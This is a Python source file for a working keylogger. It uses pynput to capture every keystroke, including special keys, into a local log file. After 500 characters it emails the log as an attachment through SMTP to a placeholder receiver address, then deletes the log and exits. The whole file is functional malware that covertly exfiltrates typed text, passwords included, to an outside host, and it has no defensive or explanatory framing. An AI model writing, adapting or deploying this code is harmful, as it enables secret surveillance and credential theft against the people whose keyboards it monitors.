from pynput import keyboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
import email
import time
import os


maxChar = 500
maxSpaces = 10
nspaces = 0
nchar = 0
text = ""

MY_ADDRESS = <YOUR ADDRESS>
PASSWORD = <YOUR PASSWORD>
TO = <RECEIVER>
HOST = <SERVER HOST>


def switch(var):
    if var == keyboard.Key.space:
        global nspaces
        global maxSpaces
        nspaces = nspaces + 1
        if maxSpaces > nspaces:
            return " "
        else:
            nspaces = 0
            return "\n"
    if var == keyboard.Key.tab:
        return "    "
    if var == keyboard.Key.esc:
        return "[ESC]"
    if var == keyboard.Key.shift:
        return "[SHIFT]"
    if var == keyboard.Key.alt:
        return "[ALT]"
    if var == keyboard.Key.alt_gr:
        return "[ALT_GR]"
    if var == keyboard.Key.cmd:
        return "[CMD]"
    if var == keyboard.Key.caps_lock:
        return "[CAPS_LOCK]"
    if var == keyboard.Key.ctrl:
        return "[CTRL]"
    if var == keyboard.Key.down:
        return "[DOWN]"
    if var == keyboard.Key.up:
        return "[UP]"
    if var == keyboard.Key.right:
        return "[RIGTH]"
    if var == keyboard.Key.left:
        return "[LEFT]"
    if var == keyboard.Key.enter:
        return "\n"

def on_press(key):

    global nchar
    global text
    global maxChar

    specialchar = ""
    special = False

    if key == keyboard.Key.alt_gr or \
       key == keyboard.Key.alt or \
       key == keyboard.Key.esc or \
       key == keyboard.Key.space or \
       key == keyboard.Key.tab or \
       key == keyboard.Key.shift or \
       key == keyboard.Key.left or \
       key == keyboard.Key.right or \
       key == keyboard.Key.up or \
       key == keyboard.Key.down or \
       key == keyboard.Key.ctrl or \
       key == keyboard.Key.caps_lock or \
       key == keyboard.Key.cmd:
        special = True
        specialchar = switch(key)
    else:
        special = False

    nchar = nchar + 1

    try:
        if special:
            text = text + specialchar
            charToAdd = specialchar
        else:
            text = text + key.char
            charToAdd = key.char
    except:
        text = text + "[SPECIAL_CHAR]"
        charToAdd = "[SPECIAL_CHAR]"

    filename = 'log.txt'
    with open(filename, 'a') as f:
        f.write(charToAdd)
        f.close()

    if nchar == maxChar:
        nchar = 0
        mailSent = sendMail(filename)
        if mailSent:
            PATH = os.getcwd() + "\\" + filename
            os.remove(PATH)
            quit()
        else:
            quit()


def sendMail(filename):
    global MY_ADDRESS,PASSWORD,HOST,TO

    try:
        msg = MIMEMultipart()
        msg['Subject'] = 'subject'
        msg['From'] = MY_ADDRESS
        msg['To'] = TO
        file = filename

        attachment = MIMEBase('application', 'octet-stream')
        attachment.set_payload(open(file, 'rb').read())
        email.encoders.encode_base64(attachment)
        attachment.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(file))
        msg.attach(attachment)

        s = smtplib.SMTP(HOST, 587)
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.login(MY_ADDRESS, PASSWORD)
        s.sendmail(MY_ADDRESS, TO, msg.as_string())
        s.quit()
        return True
    except:
        s.quit()
        return False

listener = keyboard.Listener(on_press=on_press)
listener.start()  # start to listen on a separate thread
listener.join()  # remove if main thread is polling self.keys


